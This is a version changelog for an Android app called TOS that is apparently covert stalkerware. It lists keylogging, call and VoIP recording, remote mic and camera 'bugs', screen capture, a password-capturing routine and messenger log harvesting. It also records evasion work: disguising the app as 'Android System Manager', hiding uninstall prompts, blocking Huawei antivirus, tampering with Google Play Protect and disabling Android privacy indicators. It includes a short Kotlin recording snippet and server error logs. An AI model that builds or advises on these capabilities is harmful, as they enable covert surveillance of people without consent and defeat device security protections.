# TOS-AndroidVer-1.3.9.2

Android-ver-1.3.9.2 by hassan

TOS 1.4.3:-

- added Draw Over other apps permission manually
- fixed accessibility stack overflow exception
- fixed battery level unregister receiver
- make icons adaptive for android 10

TOS 1.4.4:-

- Fixed Accessibility Service StackOverflow Exception
- Optimised Code

TOS 1.4.5:-

- Updated Code Database to new Library Room
- Structured code with design pattern
- Improve code security
- Optimised code

TOS 1.5.0:-

- Implemented Foreground services

TOS 1.5.1:-

- Change app icon and name

TOS 1.5.2:-

- Android 10 Call Recording
- IM Voip Call Recording

TOS 1.5.3:-

- Android 11 Scoped storage changes
- App Report & ScreenTime Feature added
- Fixed Samsung Secure Folder Photos Issues
- Fixed crashes & issues

TOS 1.5.4:-

- Android 10/11 call recording fixes
- Crashes Fixes

TOS 1.5.5:-

- Crashes Fixes

1.5.8:-

- add settings icon for android 10

TOS 1.5.9:-

- Screen Recording Service Changed to Node
- KeLogger
- Browser History
- Connected Networks
- Recent Activity
- Call Log
- Call Recording
- Screen Recording
- Device Info
- Bugging All

TOS 1.5.9.1

- Node 6 Server
  (
- Call Recording
- Screen Recording
- Mic Bug
- Video Bug
- Camera Bug
  )

- Node 5 Server
  (
- FCM Push
- Screenshot
- Snapchat
- Photos
  )

- Node 4 Services
  (
- KeLogger
- Browser History
- Connected Networks
- Recent Activity
- Call Logs
- Device Info
  )

TOS 1.5.9.2:-

- Fixed Screen Recording Compression Crash

TOS 1.6.0:-

- Fixes file duplicates
- Optimized keyLogger & Browsing History
- Battery Usage Optimisation
- Data Sync Improved
- Network Usage Optimisation

TOS 1.6.1:-

- Fixed Location in Sms And Call Logs
- Added Support for VOIP Call Recording for these Languages
  /** VOiP Call Recorder Languages
  English, Arabic, France, Italic, Portugues Portugal,Portuguess Brasil,Espanol Espana,Espanol
  Estados Unidos,Turkce Turkiye,PyccKNN Poccnr,Persian Irani,Chinese,
  Deutsch Deutschland,Deutsch Osterreich,Deutsch Schweiz
  **/

- Implemented Location Permission Screen For Android 10 & 11
- Updated Bugging Statuses

TOS 1.7.0:-

New Features:-

- MicBug Scheduling
- Apps Notifications Logs
- Suspicious Text Alert ( Sms Alert, CAll Alert, Notification Alert)

Fixes:-

- Fixed VOiP Call Recording Issues
- Optimised Activity Reports logs
- Optimised apps battery usages
- Improved overall app performance & working

TOS 1.7.1:-

- WhatsApp Business
- Tiktok screen recording record only when making Video

TOS 1.7.2:-

- Push Notification handled for Non-Google Play Services

TOS 1.7.3:-

- Supported SMS sent by Wifi or Mobile data
- Added Support for screen recording permission for Multiple languages
- Added the Option to skip Unsupported permission

TOS 1.7.4:-

- App Name Changed "Android System Manager"
- Android 12 Mic & Camera Block Access Issue
- Un-install Protection Dialogue Popup Hide for 1st 3 tries
- Fix crashes

TOS 1.7.5:-
Issues Fixed:-

- Improve Firebase Token Management
- Add 24 hour interval to restart the sync service
- Add Node service for activation
- Add a custom exception handler
- Fix App Stop Issue
- Fix crashes
  New Feature:-
- Change AppName and icon
- Add Hard Restart Button on Dashboard and restart app by taping on it

TOS 1.7.6.2 Change Logs:-
Issues Fixed:-

- Fix App Protection tempering Issue   :    Tested
- Fix Language Change Issue    : Tested
- Fix N/A issue  :  Tested
- Add App Restart on Device while charging     :  Tested
- Data Sync Issue Fix  :  Tested
- Fix Bugging issues for chinese Devices  :  Tested
- Fix Bugging issue for the devices which have GooglePlayServices but no Fcm token  : Tested
- Fix Screen recording auto grant permission issue with respect to different languages  : Tested
- Fix Browser History Issue  :  Tested
- Fix im messages snapchat   : Tested
- Fix Call Restriction issue   :  Tested
- Change Screen Usage scenario:Tested
- Change Photo Sync Scenario  : Tested
- Fix Screen Block dialog splashing issue   :Tested
- Block Huawei Antivirus  : Tested
- Added update status code function in onServiceDestroy Method ->insert->
  -MicBug   : Tested
  -CameraBug   : Tested
  -VideoBug    :  Tested
- Fix crashes
  Changes:
- Remove exception handling from device info and follow following scenario
  (if there is any exception during collecting device information then device info serice will not
  hit anymore. This will hit only when the service get actual data)
- Change sync time from 3 min to 15 min
- Change Media Files Record limit from 20 to 10 and simple logs limit from 100 to 50
  New Features

1) Live Screen Feature Added in view360   :  Tested
2) View360 with jitsi meet added   :  Tested

TOS-1.7.6.3

1) Fix NotificationListeningService issue
2) Add Disable Privacy Indicators functionality for android 12 and above on rooted phones
3) Add Bypass functionality for android 13 of active apps
4) VideoBug Custom data null issue resolve
5) Caused by java.lang.IllegalStateException: Only fullscreen opaque activities can request
   orientation on AntivirousActivity line # 15
6) Following changes added to screen recording processing file

- Place a Null check of media projection before starting screen recording
- Remove service running state functionality and onStartCommand abstract function
- initialize filePath with ""
- stop recording with delay of 5.5 seconds to resolve startForegroundService did not then call
  startForeground
  -Add a screenRecordingIntent check on ScreenOnOff Receiver to start recording for password chaser

TOS-1.7.6.4

1) Fix voip and call recording overlapping

TOS-1.8.0
Changes:
-Change customData in Micbug, videobug and camerabug to fix the exception of NullPointerException
with CustomData     : Done and tested
-Added uninstall receiver to remove app from installed app list from db after uninstallation     :
Done and tested
Following are changes to resolve exception on "StartForegroundService did not then called
startForeground"    : Done

- A check added on stopScreenRecording event in windowStateChangeEvent for password chasser    :
  Done
- Add current app check on onEvent in screen recording service (BY Usage access method)    : Done
- Change start recording again functionality on onDestroyService by adding following function    :
  Done
- private fun checkForRestartScreenRecording() { val currentAppPkg = AppUtils.retriveNewApp(    :
  Done
  applicationContext)
  val isNewScreenRecordingApp = AppUtils.isScreenRecordingApp(currentAppPkg)
  val shouldStartRecordingAgain =
  (isRecordingTimeEnded || isNewScreenRecordingApp)
  logVerbose(
  "last packagName while stoping= $currentAppPkg
  isNewScreenRecordingApp=$isNewScreenRecordingApp",
  "ScreenRecSerInfo"
  )
  if (shouldStartRecordingAgain && AppUtils.isScreenInteractive(
  applicationContext
  ) && isAppRecording && isCompleted
  ) { val packageName = if (isRecordingTimeEnded || currentAppPkg == appPackageName) {
  appPackageName } else { currentAppPkg } logVerbose("Screen Recording starting once again", "
  ScreenRecSerInfo")
  ActivityUtil.startScreenRecordingService(
  applicationContext, AppConstants.SCREEN_RECORDING_TYPE, packageName!!
  )
  } }
- Added a check on stop Screen recording method in accessiblity that package name != app package
  name    : Done
- Added another check in WindowsContentChangeEventData in observeVoipCalls    : Done
- Removed isMicrophoneAvailable check from call record receiver    : Done
- Replace osGreaterThanOrEqualLollipop check to osGreaterThanOrEqualMarshmallow because it was    :
  Done
  creating crash on android 5.0 (Lollipop)
- Add Update status in text alert functionality    : Done
- Implemented video bug sheduling feature    : Done
- Manage Fcm token by implementing getFcmToken   : Done

-Increase Compression ratio with ffmpeg in call recording, micbug, voip call recording  : Done
-Change compress rate from Medium to very_Low in Screen recording video compress (
VideoCompressionReceiver)  : Done
-Add compression with ffmpeg in video bug  : Done
-Change bitmap quality to 20 in screenshots and snapchat (writeToDisk())   : Done
-Change bitmap quality to 20 in Photos (ImageCompression)  : Done
-If call recording size is less than 2 KB tha isRecorded ="0" : Done
-Added Fcm Token Expiry on 401, 402, 405   : Done
-Fix Invalid Surface(name=Task=7088)/@0x64b5556, mNativeObject is null. Have you called release()
already? android media projection crash by adding a call back in createVirtualDisplay in
screenRecordCommandProcessingImpll
-Added a quality check in video compression   : Done
-Added a new check of messenger imo because it makes isModeEnabled to false for some time and it is
causing quick stop in voip call recording   : Done
-Added check of android nougat in ffmpeg compression in micbug, videobug, voipcallRecor,
callRecording    : Done
-Removed lightCompressor library because it was creating crash on some devices due to media codec
not supported
Issue:
Foreground Service did not start on Time on Call Recording service
Solution
Added an event bug in callRecordProcessingImpll which stops call recording and stops the service
itself after 8.5 sec ,
this event will sent from WindowContentChangeEventData if call recording service running during voip
call    : Done
Fetal Exception Fixes:

- Add Null check in SmsCollector at messageNumber    : Done
- Add Null check in InstalledAppCollector at appVersion    : Done
- Add Null check in getPhoneNumber function at getLineNumber    : Done
- Add Null check in smsRecipient in SmsLogCollector    : Done
- Add a AppConstants.osLessThanTen check on getSimId function in DeviceInfoUtil    : Done
- Move getRootInActiveWindow() function in executor block to prevent ANR in
  TOSAccessibilityService   : Done
- Add a check in VoipCallRecording service in startRecoding
- Change addMissedCall functionality and added an executer and change the place of getLastCallId
  function to pevent ANR in CallRecordReceiver
- Change the place of getLastCallId function in callRecordProcessingImpll
- Change addMissedCall function from AppUtils and remove handler post delay and added an Thread
  sleep in it
  -Change The Observe Voip Call Recording funtion in windowContentChangeEventData
  Backup Changes:
- Other device and expiry date added in device information service response , parse response and
  then insert other devices to db
- Upload other devices and expiryDate in body to maintain a backup of user services in auth service
- StatusCode 400 added in auth service after which i expire the auth token as well as fcm token and
  turn off all sync settings    : Pending
- Resolve an issue in fcmToken service at server side
  /root/.pm2/logs/app-error.log last 15 lines:
  0|app | at Layer.handle [as handle_request] (
  /root/appserver/node_modules/express/lib/router/layer.js:95:5)
  0|app | at /root/appserver/node_modules/express/lib/router/index.js:284:15
  0|app | at Function.process_params (/root/appserver/node_modules/express/lib/router/index.js:346:
  12)
  0|app | TypeError: Cannot read properties of undefined (reading 'fcmToken')
  0|app | at Query.<anonymous> (/root/appserver/actions/fcmtoken.actions.js:168:36)
  0|app | at Query.<anonymous> (/root/appserver/node_modules/mysql/lib/Connection.js:526:10)
  0|app | at Query._callback (/root/appserver/node_modules/mysql/lib/Connection.js:488:16)
  0|app | at Query.Sequence.end (
  /root/appserver/node_modules/mysql/lib/protocol/sequences/Sequence.js:83:24)
  0|app | at Query._handleFinalResultPacket (
  /root/appserver/node_modules/mysql/lib/protocol/sequences/Query.js:149:8)
  0|app | at Query.EofPacket (/root/appserver/node_modules/mysql/lib/protocol/sequences/Query.js:
  133:8)
  0|app | at Protocol._parsePacket (/root/appserver/node_modules/mysql/lib/protocol/Protocol.js:291:
  23)
  0|app | at Parser._parsePacket (/root/appserver/node_modules/mysql/lib/protocol/Parser.js:433:10)
  0|app | at Parser.write (/root/appserver/node_modules/mysql/lib/protocol/Parser.js:43:10)
  0|app | at Protocol.write (/root/appserver/node_modules/mysql/lib/protocol/Protocol.js:38:16)
  0|app | Sat, 25 Mar 2023 15:20:45 GMT express deprecated res.status("200"): use res.status(200)
  instead at routes/screenrecording.js:212:30
  Pending issues for new version:
  -Fix voip call recording issue by using notification listening service
  -Fix Camera bug issue on huawei device . Service does not stop
  -Push not sent to device by firebase or sometimes push status not update
  -Sometimes push sent but file not upload
  -Update libraries
  -Update target sdk version to 33

TOS-1.8.1 Changes:
-Add checkPrivacyIndicatorScreenAndTemper in window content change for android 12 and 13
-Change video compression resolution from 640x360 to 360x640 and change the functionality on command
cancel or command error
-Change CheckBugStatus function, startView360Function and startJitsiVideoFunction
-Added following functionality in BackgroundServicesActivity
if (!isFinishing)
finishAndRemoveTask()
-Added Intent.FLAG_ACTIVITY_CLEAR_TASK flage in startScreenRecordingService
-Added facebook im logs feature
-Added Skype im logs feature
-Change if condition to else if in InstantMessenger and MessageApp logic in WindowContentChanged
-Add sync setting check on all features before insertion including InstantMessages and Push base
features in FirebasePushUtil
-Change hard restart app funtionality

TOS-1.8.2 Changes:
-Stop view360 while voip call
-Fixed accessbility not splashing issue on samsung
-Fixed installation stuck issue on Disable notification settings
-Added Worker manager for data uploading, micbug, videobug, call recording, voip call recording,
view360, view360ByJitsi
-Added temperation on google play protect
-Change voip call funtionality in insert funtion

